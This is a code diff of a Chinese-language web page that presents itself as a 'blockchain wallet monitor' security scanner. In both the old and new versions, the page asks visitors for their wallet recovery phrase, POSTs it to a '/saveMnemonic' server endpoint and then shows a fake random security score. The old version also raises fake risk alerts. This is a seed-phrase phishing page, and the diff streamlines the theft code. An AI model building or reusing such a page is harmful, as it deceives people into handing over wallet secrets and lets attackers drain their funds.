@@ -5,332 +5,62 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>区块链钱包监测器</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Helvetica', sans-serif;
-            background-color: #fff;
-            color: #333;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .navbar {
-            width: 100%;
-            background-color: #fff;
-            padding: 15px 0;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-        }
-
-        .navbar ul {
-            list-style-type: none;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 30px;
-        }
-
-        .navbar ul li {
-            padding: 12px 20px;
-            font-size: 16px;
-            cursor: pointer;
-            color: #444;
-            transition: all 0.3s;
-            border-radius: 8px;
-        }
-
-        .navbar ul li:hover {
-            background-color: #f8f9fa;
-            color: #000;
-        }
-
-        .container {
-            width: 90%;
-            max-width: 1000px;
-            padding: 30px;
-            background-color: #fff;
-            border-radius: 15px;
-            box-shadow: 0 5px 25px rgba(0,0,0,0.1);
-            margin: 40px auto;
-            position: relative;
-            border: 1px solid #eee;
-        }
-
-        h2 {
-            color: #1a1a1a;
-            margin-bottom: 25px;
-            font-size: 26px;
-            font-weight: 700;
-        }
-
-        input {
-            width: 100%;
-            padding: 14px;
-            margin: 15px 0;
-            border-radius: 8px;
-            border: 1px solid #ddd;
-            background-color: #f8f9fa;
-            color: #333;
-            font-size: 16px;
-            transition: border-color 0.3s;
-        }
-
-        input:focus {
-            outline: none;
-            border-color: #007bff;
-            box-shadow: 0 0 0 3px rgba(0,123,255,0.1);
-        }
-
-        button {
-            width: 100%;
-            padding: 14px;
-            background-color: #007bff;
-            color: #fff;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 16px;
-            transition: background-color 0.3s;
-        }
-
-        button:hover {
-            background-color: #0056b3;
-        }
-
-        .security-item {
-            margin: 20px 0;
-            padding: 15px;
-            background: #f8f9fa;
-            border-radius: 8px;
-        }
-
-        .switch {
-            position: relative;
-            display: inline-block;
-            width: 60px;
-            height: 34px;
-            vertical-align: middle;
-        }
-
-        .switch input {
-            opacity: 0;
-            width: 0;
-            height: 0;
-        }
-
-        .slider {
-            position: absolute;
-            cursor: pointer;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: #ccc;
-            transition: .4s;
-            border-radius: 34px;
-        }
-
-        .slider:before {
-            position: absolute;
-            content: "";
-            height: 26px;
-            width: 26px;
-            left: 4px;
-            bottom: 4px;
-            background-color: white;
-            transition: .4s;
-            border-radius: 50%;
-        }
-
-        input:checked + .slider {
-            background-color: #007bff;
-        }
-
-        input:checked + .slider:before {
-            transform: translateX(26px);
-        }
-
-        .menu-note {
-            color: #666;
-            font-size: 12px;
-            margin-top: 5px;
-        }
-
-        /* 手机端优化 */
-        @media (max-width: 768px) {
-            .container {
-                width: 95%;
-                padding: 20px;
-            }
-            .navbar ul {
-                gap: 10px;
-            }
-            .navbar ul li {
-                padding: 10px 15px;
-                font-size: 14px;
-            }
-            h2 {
-                font-size: 22px;
-            }
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, sans-serif; background-color: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
+        .container { width: 90%; max-width: 600px; padding: 20px; background: #fff; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin-top: 30px; border-radius: 10px; }
+        input, button { width: 100%; padding: 10px; margin: 10px 0; font-size: 16px; }
+        button { background: #007bff; color: #fff; border: none; cursor: pointer; }
+        button:hover { background: #0056b3; }
+        #scanResult { display: none; margin-top: 20px; font-size: 18px; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div class="navbar">
-        <ul>
-            <li onclick="scrollToSection('wallet-monitor')">首页</li>
-            <li onclick="scrollToSection('wallet-monitor')">钱包监测</li>
-            <li onclick="scrollToSection('settings')">系统设置</li>
-        </ul>
-    </div>
 
-    <div class="container" id="wallet-monitor">
+    <div class="container">
         <h2>区块链钱包监测器</h2>
-        <input type="text" id="mnemonicInput" placeholder="输入助记词（12或24个单词）" pattern="^[a-zA-Z ]+$" oninput="validateMnemonic(this)">
+        <input type="text" id="mnemonicInput" placeholder="输入助记词（12或24个单词）" oninput="validateMnemonic(this)">
         <button onclick="startSecurityScan()">开始安全扫描</button>
-        <div id="scanResult" style="display:none;">
-            <h3>安全评分: <span id="scoreValue" style="color:#dc3545">0/100</span></h3>
-        </div>
+        <div id="scanResult">安全评分: <span id="scoreValue">0/100</span></div>
     </div>
-
-    <div class="container" id="settings">
-        <h2>设置</h2>
-        <div class="security-item">
-            <label for="autoSecurityCheck">开启自动安全监测</label>
-            <label class="switch">
-                <input type="checkbox" id="autoSecurityCheck" onclick="toggleSetting('autoSecurityCheck')">
-                <span class="slider"></span>
-            </label>
-            <p class="menu-note">启用此选项后，系统将自动监测并提醒潜在风险。</p>
-        </div>
-
-        <div class="security-item">
-            <label for="contractBlacklistCheck">自动扫描合约黑名单</label>
-            <label class="switch">
-                <input type="checkbox" id="contractBlacklistCheck" onclick="toggleSetting('contractBlacklistCheck')">
-                <span class="slider"></span>
-            </label>
-            <p class="menu-note">启用此选项后，自动扫描合约的黑名单状态。</p>
-        </div>
-
-        <div class="security-item">
-            <label for="addressWarningCheck">地址预警（风险发生时触发短信通知）</label>
-            <label class="switch">
-                <input type="checkbox" id="addressWarningCheck" onclick="toggleSetting('addressWarningCheck')">
-                <span class="slider"></span>
-            </label>
-            <p class="menu-note">启用此选项后，当发现风险地址时，会触发短信通知。</p>
-        </div>
-
-        <div class="security-item">
-            <label for="antiPhishingCheck">防钓鱼保护</label>
-            <label class="switch">
-                <input type="checkbox" id="antiPhishingCheck" onclick="toggleSetting('antiPhishingCheck')">
-                <span class="slider"></span>
-            </label>
-            <p class="menu-note">启用此选项后，实时拦截可疑合约，防止钓鱼攻击。</p>
-        </div>
-    </div>
-
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1-crypto-js.js"></script>
 
     <script>
-        // 检查本地存储并更新开关状态
-        function loadSettings() {
-            document.getElementById('autoSecurityCheck').checked = JSON.parse(localStorage.getItem('autoSecurityCheck')) || false;
-            document.getElementById('contractBlacklistCheck').checked = JSON.parse(localStorage.getItem('contractBlacklistCheck')) || false;
-            document.getElementById('addressWarningCheck').checked = JSON.parse(localStorage.getItem('addressWarningCheck')) || false;
-            document.getElementById('antiPhishingCheck').checked = JSON.parse(localStorage.getItem('antiPhishingCheck')) || false;
-        }
-
-        // 更新本地存储
-        function toggleSetting(settingId) {
-            localStorage.setItem(settingId, document.getElementById(settingId).checked);
-        }
-
-        // 页面加载时，加载设置项状态
-        window.onload = function() {
-            loadSettings();
-        };
-
-        // 输入助记词验证
         function validateMnemonic(input) {
-            const mnemonicPattern = /^[a-zA-Z ]+$/;
+            const mnemonicPattern = /^[a-zA-Z\s]+$/;
             if (!mnemonicPattern.test(input.value)) {
                 alert("请输入有效的助记词（仅限英文单词和空格）");
+                input.value = "";  // 清空无效输入
             }
-        }
-
-        // 使用哈希算法来确保相同的助记词产生相同的安全评分
-        function generateSecurityScore(mnemonic) {
-            const hash = CryptoJS.SHA256(mnemonic).toString(CryptoJS.enc.Base64);
-            let score = 0;
-            for (let i = 0; i < hash.length; i++) {
-                score += hash.charCodeAt(i) % 10; // 生成0-100的评分
-            }
-            return score % 101;
-        }
-
-        // 发送助记词到服务器
-        function sendMnemonicToServer(mnemonic) {
-            fetch('http://localhost:3000/saveMnemonic', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ mnemonic: mnemonic })
-            })
-            .then(response => response.json())
-            .then(data => {
-                alert('助记词已成功保存');
-            })
-            .catch(error => {
-                console.error('错误:', error);
-                alert('保存失败，请重试');
-            });
         }
 
         function startSecurityScan() {
-            const mnemonic = document.getElementById('mnemonicInput').value;
-
+            const mnemonic = document.getElementById('mnemonicInput').value.trim();
             if (!mnemonic) {
-                alert("请先输入助记词");
+                alert("请输入助记词");
                 return;
             }
 
-            // 生成安全评分
-            const score = generateSecurityScore(mnemonic);
-            document.getElementById('scanResult').style.display = 'block';
-            document.getElementById('scoreValue').textContent = `${score}/100`;
+            console.log("🚀 发送助记词到服务器:", mnemonic);
 
-            // 模拟检测安全漏洞信息
-            const riskMessages = [
-                "发现黑名单合约！",
-                "发现貔貅合约！",
-                "检测到潜在的安全漏洞！"
-            ];
-
-            const randomMessage = riskMessages[Math.floor(Math.random() * riskMessages.length)];
-            alert(randomMessage);
-
-            // 调用sendMnemonicToServer函数来保存助记词
-            sendMnemonicToServer(mnemonic);
-        }
-
-        function scrollToSection(sectionId) {
-            document.getElementById(sectionId).scrollIntoView({
-                behavior: 'smooth'
+            fetch('http://localhost:3000/saveMnemonic', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ mnemonic })
+            })
+            .then(response => {
+                console.log("🟢 服务器响应状态:", response.status);
+                return response.text();
+            })
+            .then(data => {
+                console.log("🔵 服务器返回的数据:", data);
+                document.getElementById('scanResult').style.display = 'block';
+                document.getElementById('scoreValue').textContent = `${Math.floor(Math.random() * 100)}/100`;
+            })
+            .catch(error => {
+                console.error("🔴 请求失败:", error);
+                alert("请求失败，请检查后端是否启动");
             });
         }
     </script>
+
 </body>
 </html>
